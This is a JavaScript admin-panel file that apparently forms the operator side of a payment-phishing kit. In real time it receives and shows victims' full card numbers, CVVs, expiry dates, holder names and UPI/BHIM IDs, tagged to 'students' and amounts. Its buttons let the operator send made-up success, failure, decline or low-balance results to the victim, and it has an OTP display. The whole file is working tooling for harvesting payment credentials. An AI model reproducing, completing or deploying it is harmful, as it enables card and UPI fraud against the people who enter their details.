// Admin Panel - Real-Time Card Submission Management (ENHANCED WITH PERSISTENCE)
// Socket.IO Client for Real-Time Communication

let socket = null;
const submissions = new Map(); // Store submissions by sessionId

// Initialize Socket.IO Connection
function initializeConnection() {
    socket = io('http://localhost:3000', {
        transports: ['websocket', 'polling'],
        reconnection: true,
        reconnectionDelay: 1000,
        reconnectionAttempts: 10
    });

    // Connection Events
    socket.on('connect', () => {
        console.log('✅ Connected to server');
        updateConnectionStatus(true);
        // Load all previous submissions when connected
        loadAllSubmissions();
    });

    socket.on('disconnect', () => {
        console.log('❌ Disconnected from server');
        updateConnectionStatus(false);
    });

    socket.on('connect_error', (error) => {
        console.error('Connection error:', error);
        updateConnectionStatus(false);
    });

    // Connection Update
    socket.on('connectionUpdate', (data) => {
        updateConnectionCount(data.activeConnections || 0);
    });

    // Real-Time Card Details Received
    socket.on('cardDetailsReceived', (data) => {
        console.log('💳 New card details received:', data);
        handleNewCardSubmission(data);
    });

    // UPI Details Received
    socket.on('upiDetailsReceived', (data) => {
        console.log('📱 New UPI details received:', data);
        handleNewUpiSubmission(data);
    });

    // BHIM Details Received
    socket.on('bhimDetailsReceived', (data) => {
        console.log('💳 New BHIM details received:', data);
        handleNewBhimSubmission(data);
    });

    // Payment Status Updates
    socket.on('paymentCompleted', (data) => {
        console.log('✅ Payment completed:', data);
        updateSubmissionStatus(data.sessionId, 'completed');
    });

    socket.on('paymentFailed', (data) => {
        console.log('❌ Payment failed:', data);
        updateSubmissionStatus(data.sessionId, 'failed', data.reason);
    });
    
    // NEW: Listen for submission marked as seen from other admins
    socket.on('submissionMarkedSeen', (data) => {
        console.log('👁️ Submission marked as seen:', data.sessionId);
        removeRedBorder(data.sessionId);
    });
    
    // NEW: Listen for commands hidden from other admins
    socket.on('submissionCommandsHidden', (data) => {
        console.log('🙈 Commands hidden:', data.sessionId);
        hideCommandsForSubmission(data.sessionId);
    });
}

// NEW: Load all previous submissions from database
async function loadAllSubmissions() {
    try {
        const response = await fetch('http://localhost:3000/api/admin/submissions');
        const result = await response.json();
        
        if (result.success) {
            console.log(`📥 Loaded ${result.total} previous submissions`);
            
            // Clear existing submissions
            submissions.clear();
            const grid = document.getElementById('submissionsGrid');
            grid.innerHTML = '';
            
            // Render all submissions (oldest first, then reverse to show newest on top)
            result.submissions.reverse().forEach(submission => {
                submissions.set(submission.sessionId, submission);
                renderSubmission(submission, false); // false = not new
            });
            
            if (result.total === 0) {
                showEmptyState();
            } else {
                hideEmptyState();
            }
        }
    } catch (error) {
        console.error('Error loading submissions:', error);
        showNotification('Failed to load previous submissions', 'error');
    }
}

// Update Connection Status Indicator
function updateConnectionStatus(isConnected) {
    const statusDot = document.querySelector('.status-dot');
    const statusText = document.querySelector('.status-text');
    
    if (isConnected) {
        statusDot.style.background = '#00ff00';
        statusText.textContent = 'Live';
    } else {
        statusDot.style.background = '#ff0000';
        statusText.textContent = 'Disconnected';
    }
}

// Update Connection Count
function updateConnectionCount(count) {
    const connectionCount = document.getElementById('connectionCount');
    if (connectionCount) {
        connectionCount.textContent = `Connections: ${count}`;
    }
}

// Handle New Card Submission
function handleNewCardSubmission(data) {
    const submission = {
        sessionId: data.sessionId,
        type: 'card',
        student: data.student,
        cardDetails: data.cardDetails,
        amount: data.amount,
        timestamp: data.timestamp || new Date().toISOString(),
        status: data.status || 'processing',
        isSeen: false, // New submissions are unseen
        commandsHidden: false
    };
    
    submissions.set(data.sessionId, submission);
    renderSubmission(submission, true); // true = is new
    hideEmptyState();
}

// Handle New UPI Submission
function handleNewUpiSubmission(data) {
    const submission = {
        sessionId: data.sessionId,
        type: 'upi',
        student: data.student,
        upiDetails: data.upiDetails,
        amount: data.amount,
        timestamp: data.timestamp || new Date().toISOString(),
        status: data.status || 'processing',
        isSeen: false,
        commandsHidden: false
    };
    
    submissions.set(data.sessionId, submission);
    renderSubmission(submission, true);
    hideEmptyState();
}

// Handle New BHIM Submission
function handleNewBhimSubmission(data) {
    const submission = {
        sessionId: data.sessionId,
        type: 'bhim',
        student: data.student,
        bhimDetails: data.bhimDetails,
        amount: data.amount,
        timestamp: data.timestamp || new Date().toISOString(),
        status: data.status || 'processing',
        isSeen: false,
        commandsHidden: false
    };
    
    submissions.set(data.sessionId, submission);
    renderSubmission(submission, true);
    hideEmptyState();
}

// Render Submission Card (MODIFIED FOR SINGLE-LINE LAYOUT)
function renderSubmission(submission, isNew = false) {
    const grid = document.getElementById('submissionsGrid');
    
    // Check if card already exists
    const existingCard = document.getElementById(`card-${submission.sessionId}`);
    if (existingCard) {
        existingCard.remove();
    }
    
    const row = document.createElement('div');
    row.className = 'submission-row';
    row.id = `card-${submission.sessionId}`;
    
    // Add red border if not seen
    if (isNew || !submission.isSeen) {
        row.classList.add('unseen');
    }
    
    // Add click handler to mark as seen
    row.addEventListener('click', () => {
        markSubmissionAsSeen(submission.sessionId);
    }, { once: true });
    
    const formattedTime = formatTimestamp(submission.timestamp);
    
    let detailsHtml = '';
    
    if (submission.type === 'card') {
        detailsHtml = `
            <div class="submission-details">
                <span class="detail-compact"><strong>Card:</strong> ${submission.cardDetails.cardNumber}</span>
                <span class="detail-separator">|</span>
                <span class="detail-compact"><strong>CVV:</strong> ${submission.cardDetails.cvv}</span>
                <span class="detail-separator">|</span>
                <span class="detail-compact"><strong>Exp:</strong> ${submission.cardDetails.expiryDate}</span>
                <span class="detail-separator">|</span>
                <span class="detail-compact"><strong>Holder:</strong> ${submission.cardDetails.cardHolderName}</span>
                <span class="detail-separator">|</span>
                <span class="detail-compact"><strong>Amount:</strong> ₹${submission.amount.toLocaleString('en-IN')}</span>
            </div>
        `;
    } else if (submission.type === 'upi') {
        detailsHtml = `
            <div class="submission-details">
                <span class="detail-compact"><strong>UPI ID:</strong> ${submission.upiDetails.upiId}</span>
                <span class="detail-separator">|</span>
                <span class="detail-compact"><strong>App:</strong> ${submission.upiDetails.upiApp || 'Unknown'}</span>
                <span class="detail-separator">|</span>
                <span class="detail-compact"><strong>Amount:</strong> ₹${submission.amount.toLocaleString('en-IN')}</span>
            </div>
        `;
    } else if (submission.type === 'bhim') {
        detailsHtml = `
            <div class="submission-details">
                <span class="detail-compact"><strong>BHIM UPI:</strong> ${submission.bhimDetails.upiId}</span>
                <span class="detail-separator">|</span>
                <span class="detail-compact"><strong>App:</strong> ${submission.bhimDetails.upiApp || 'Unknown'}</span>
                <span class="detail-separator">|</span>
                <span class="detail-compact"><strong>Amount:</strong> ₹${submission.amount.toLocaleString('en-IN')}</span>
            </div>
        `;
    }
    
    // Commands section - can be hidden
    const commandsVisibility = submission.commandsHidden ? 'style="display: none;"' : '';
    
    // Different commands based on payment type
    let commandsHtml = '';
    if (submission.type === 'card') {
        commandsHtml = `
            <button class="command-btn-inline btn-success" onclick="executeCommand('${submission.sessionId}', 'success')">
                ✅ Success
            </button>
            <button class="command-btn-inline btn-fail" onclick="executeCommand('${submission.sessionId}', 'fail')">
                ❌ Fail
            </button>
            <button class="command-btn-inline btn-otp" onclick="toggleOTP('${submission.sessionId}')">
                🔐 Show OTP
            </button>
            <button class="command-btn-inline btn-invalid" onclick="executeCommand('${submission.sessionId}', 'invalid')">
                ⚠️ Invalid Card
            </button>
            <button class="command-btn-inline btn-declined" onclick="executeCommand('${submission.sessionId}', 'declined')">
                🚫 Declined
            </button>
            <button class="command-btn-inline btn-hide" onclick="hideCommands('${submission.sessionId}')">
                👁️ Hide
            </button>
        `;
    } else if (submission.type === 'upi') {
        commandsHtml = `
            <button class="command-btn-inline btn-success" onclick="executeCommand('${submission.sessionId}', 'success')">
                ✅ Success
            </button>
            <button class="command-btn-inline btn-fail" onclick="executeCommand('${submission.sessionId}', 'fail')">
                ❌ Fail
            </button>
            <button class="command-btn-inline btn-invalid" onclick="executeCommand('${submission.sessionId}', 'invalid_upi')">
                ⚠️ Invalid UPI
            </button>
            <button class="command-btn-inline btn-declined" onclick="executeCommand('${submission.sessionId}', 'declined')">
                🚫 Payment Declined
            </button>
            <button class="command-btn-inline btn-balance" onclick="executeCommand('${submission.sessionId}', 'balance_low')">
                💰 Balance Low
            </button>
            <button class="command-btn-inline btn-hide" onclick="hideCommands('${submission.sessionId}')">
                👁️ Hide
            </button>
        `;
    } else if (submission.type === 'bhim') {
        commandsHtml = `
            <button class="command-btn-inline btn-success" onclick="executeCommand('${submission.sessionId}', 'success')">
                ✅ Success
            </button>
            <button class="command-btn-inline btn-fail" onclick="executeCommand('${submission.sessionId}', 'fail')">
                ❌ Fail
            </button>
            <button class="command-btn-inline btn-invalid" onclick="executeCommand('${submission.sessionId}', 'invalid_upi')">
                ⚠️ Invalid UPI
            </button>
            <button class="command-btn-inline btn-declined" onclick="executeCommand('${submission.sessionId}', 'declined')">
                🚫 Payment Declined
            </button>
            <button class="command-btn-inline btn-balance" onclick="executeCommand('${submission.sessionId}', 'balance_low')">
                💰 Balance Low
            </button>
            <button class="command-btn-inline btn-hide" onclick="hideCommands('${submission.sessionId}')">
                👁️ Hide
            </button>
        `;
    }
    
    row.innerHTML = `
        ${detailsHtml}
        <div class="commands-section-inline" id="commands-${submission.sessionId}" ${commandsVisibility}>
            ${commandsHtml}
        </div>
        <div class="otp-display-inline" id="otp-${submission.sessionId}" style="display: none;">
            <span class="otp-label">OTP:</span>
            <span class="otp-value">123456</span>
        </div>
    `;
    
    // Insert at the beginning (newest first)
    grid.insertBefore(row, grid.firstChild);
}

// NEW: Mark submission as seen (remove red border)
async function markSubmissionAsSeen(sessionId) {
    const submission = submissions.get(sessionId);
    if (!submission || submission.isSeen) return;
    
    submission.isSeen = true;
    
    // Remove red border visually
    removeRedBorder(sessionId);
    
    // Notify server and other admins
    socket.emit('markSubmissionSeen', { sessionId });
    
    try {
        await fetch(`http://localhost:3000/api/admin/submissions/${sessionId}/seen`, {
            method: 'POST'
        });
    } catch (error) {
        console.error('Error marking submission as seen:', error);
    }
}

// NEW: Remove red border from submission
function removeRedBorder(sessionId) {
    const row = document.getElementById(`card-${sessionId}`);
    if (row) {
        row.classList.remove('unseen');
    }
}

// NEW: Hide commands for a submission
async function hideCommands(sessionId) {
    const submission = submissions.get(sessionId);
    if (!submission) return;
    
    submission.commandsHidden = true;
    
    // Hide visually
    hideCommandsForSubmission(sessionId);
    
    // Notify server and other admins
    socket.emit('hideSubmissionCommands', { sessionId });
    
    try {
        await fetch(`http://localhost:3000/api/admin/submissions/${sessionId}/hide-commands`, {
            method: 'POST'
        });
        showNotification('Commands hidden for this submission', 'info');
    } catch (error) {
        console.error('Error hiding commands:', error);
    }
}

// NEW: Hide commands for submission (visual only)
function hideCommandsForSubmission(sessionId) {
    const commandsSection = document.getElementById(`commands-${sessionId}`);
    if (commandsSection) {
        commandsSection.style.display = 'none';
    }
}

// Execute Admin Command
function executeCommand(sessionId, action) {
    const submission = submissions.get(sessionId);
    if (!submission) {
        console.error('Submission not found:', sessionId);
        return;
    }
    
    console.log(`⚙️ Executing command: ${action} for session: ${sessionId}`);
    
    if (action === 'success') {
        socket.emit('adminCommand', {
            command: 'approvePayment',
            sessionId: sessionId,
            action: 'approve'
        });
        
        updateSubmissionStatus(sessionId, 'completed');
        showNotification(`✅ Payment approved for ${submission.student.name}`, 'success');
        
    } else if (action === 'fail') {
        const reason = prompt('Enter rejection reason:', 'Card declined') || 'Card declined';
        
        socket.emit('adminCommand', {
            command: 'rejectPayment',
            sessionId: sessionId,
            action: 'reject',
            reason: reason
        });
        
        updateSubmissionStatus(sessionId, 'failed', reason);
        showNotification(`❌ Payment rejected for ${submission.student.name}`, 'error');
        
    } else if (action === 'invalid') {
        socket.emit('adminCommand', {
            command: 'rejectPayment',
            sessionId: sessionId,
            action: 'invalid',
            reason: 'Invalid card details'
        });
        
        updateSubmissionStatus(sessionId, 'invalid');
        showNotification(`⚠️ Payment marked as invalid for ${submission.student.name}`, 'warning');
    }
}

// Toggle OTP Display
function toggleOTP(sessionId) {
    const otpDisplay = document.getElementById(`otp-${sessionId}`);
    if (otpDisplay) {
        if (otpDisplay.style.display === 'none') {
            const otp = Math.floor(100000 + Math.random() * 900000);
            otpDisplay.querySelector('.otp-value').textContent = otp;
            otpDisplay.style.display = 'inline-block';
            showNotification(`🔐 OTP displayed for session ${sessionId}`, 'info');
        } else {
            otpDisplay.style.display = 'none';
        }
    }
}

// Update Submission Status
function updateSubmissionStatus(sessionId, status, reason = null) {
    const submission = submissions.get(sessionId);
    if (submission) {
        submission.status = status;
        if (reason) {
            submission.failureReason = reason;
        }
        
        // Disable commands after action
        const commandsSection = document.getElementById(`commands-${sessionId}`);
        if (commandsSection) {
            const buttons = commandsSection.querySelectorAll('.command-btn-inline');
            buttons.forEach(btn => {
                btn.disabled = true;
                btn.style.opacity = '0.5';
                btn.style.cursor = 'not-allowed';
            });
        }
    }
}

// Show Notification
function showNotification(message, type = 'info') {
    console.log(`[${type.toUpperCase()}] ${message}`);
    
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 100px;
        right: 40px;
        background: ${type === 'success' ? '#00cc00' : type === 'error' ? '#cc0000' : type === 'warning' ? '#cc6600' : '#0066cc'};
        color: #ffffff;
        padding: 15px 20px;
        border-radius: 8px;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        z-index: 1000;
        font-size: 14px;
        font-weight: 500;
        animation: slideInRight 0.3s ease-out;
    `;
    notification.textContent = message;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.style.animation = 'slideOutRight 0.3s ease-out';
        setTimeout(() => {
            notification.remove();
        }, 300);
    }, 3000);
}

// Hide Empty State
function hideEmptyState() {
    const emptyState = document.getElementById('emptyState');
    if (emptyState) {
        emptyState.style.display = 'none';
    }
}

// Show Empty State
function showEmptyState() {
    const emptyState = document.getElementById('emptyState');
    if (emptyState) {
        emptyState.style.display = 'block';
    }
}

// Format Timestamp
function formatTimestamp(timestamp) {
    const date = new Date(timestamp);
    const now = new Date();
    const diffMs = now - date;
    const diffMins = Math.floor(diffMs / 60000);
    
    if (diffMins < 1) {
        return 'Just now';
    } else if (diffMins < 60) {
        return `${diffMins} minute${diffMins > 1 ? 's' : ''} ago`;
    } else {
        const hours = date.getHours().toString().padStart(2, '0');
        const minutes = date.getMinutes().toString().padStart(2, '0');
        return `${hours}:${minutes}`;
    }
}

// Add CSS animations
const style = document.createElement('style');
style.textContent = `
    @keyframes slideInRight {
        from {
            transform: translateX(400px);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    @keyframes slideOutRight {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(400px);
            opacity: 0;
        }
    }
`;
document.head.appendChild(style);

// Initialize on page load
window.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Admin Panel initialized');
    initializeConnection();
});
